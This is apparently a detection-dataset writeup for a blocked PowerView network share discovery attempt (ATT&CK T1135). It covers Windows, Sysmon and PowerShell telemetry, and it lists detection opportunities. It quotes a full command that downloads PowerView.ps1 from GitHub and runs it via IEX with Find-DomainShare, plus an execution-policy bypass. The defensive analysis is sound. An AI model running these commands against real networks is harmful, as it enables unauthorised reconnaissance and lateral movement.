# T1135-7: Network Share Discovery — Share Discovery with PowerView

## Technique Context

Network Share Discovery (T1135) involves adversaries attempting to enumerate network shares on local and remote systems to identify accessible resources for lateral movement, data collection, or privilege escalation. PowerView, part of the PowerSploit framework, is a popular PowerShell-based reconnaissance tool that provides extensive Active Directory and network enumeration capabilities, including share discovery functions like `Find-DomainShare`. The detection community focuses on identifying PowerView usage through its distinctive PowerShell patterns, network enumeration behaviors, and the characteristic commands that query domain resources and test share accessibility.

## What This Dataset Contains

This dataset captures a PowerView-based network share discovery attempt that was blocked by Windows Defender. The key evidence includes:

**Process Creation Evidence (Security 4688):**
- PowerShell execution with command: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose}`
- Process exit with status `0xC0000022` (STATUS_ACCESS_DENIED) indicating Windows Defender blocked execution

**PowerShell Telemetry (EID 4103/4104):**
- Execution policy bypass: `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass`
- Multiple script block creation events containing only PowerShell test framework boilerplate (`Set-StrictMode` fragments)
- No evidence of PowerView script content being logged, indicating early termination

**Sysmon Evidence:**
- Process creation for `whoami.exe` (EID 1) from PowerShell, suggesting some initial execution occurred
- Multiple DLL loads including Windows Defender components (`MpOAV.dll`, `MpClient.dll`) indicating security scanning
- Process access and CreateRemoteThread events showing PowerShell attempting process injection/manipulation
- urlmon.dll loading suggesting network activity preparation

## What This Dataset Does Not Contain

This dataset lacks the actual PowerView execution telemetry due to Windows Defender's intervention:
- No PowerView script block content in PowerShell logs
- No network connections to GitHub for PowerView download
- No actual share enumeration network traffic
- No domain queries or LDAP activity from PowerView functions
- No SMB/NetBIOS share discovery attempts
- Missing Sysmon ProcessCreate events for the main PowerShell process (filtered by sysmon-modular include-mode config)

The early termination means we see the attempt but not the technique's successful execution or its characteristic network behaviors.

## Assessment

This dataset provides excellent visibility into PowerView download attempts and Windows Defender's blocking capabilities, but limited value for understanding successful T1135 execution patterns. The Security 4688 events with full command-line logging prove most valuable here, capturing the complete PowerView download and execution command despite Sysmon filtering. The combination of execution policy bypass, remote PowerShell script download patterns, and Defender blocking provides strong detection content for similar attempts, even when unsuccessful.

## Detection Opportunities Present in This Data

1. **PowerView Download Pattern Detection** - Monitor for PowerShell commands containing GitHub URLs to PowerSploit/PowerView repositories, especially with specific commit hashes
2. **PowerShell Execution Policy Bypass** - Detect `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass` in Security 4688 or PowerShell 4103 logs
3. **Malicious PowerShell One-Liner Pattern** - Alert on PowerShell commands combining TLS protocol setting, IEX (Invoke-Expression), IWR (Invoke-WebRequest), and domain enumeration functions
4. **Windows Defender Block Correlation** - Correlate PowerShell process exits with STATUS_ACCESS_DENIED (0xC0000022) and Defender DLL loads to identify blocked malicious scripts
5. **Remote Script Execution Attempt** - Monitor for PowerShell processes loading urlmon.dll combined with GitHub raw content URLs in command lines
6. **PowerView Function Names** - Search for `Find-DomainShare`, `-CheckShareAccess`, and other PowerView-specific cmdlets in process command lines
7. **Suspicious Process Creation Chain** - Detect PowerShell spawning reconnaissance utilities like `whoami.exe` in combination with network enumeration indicators
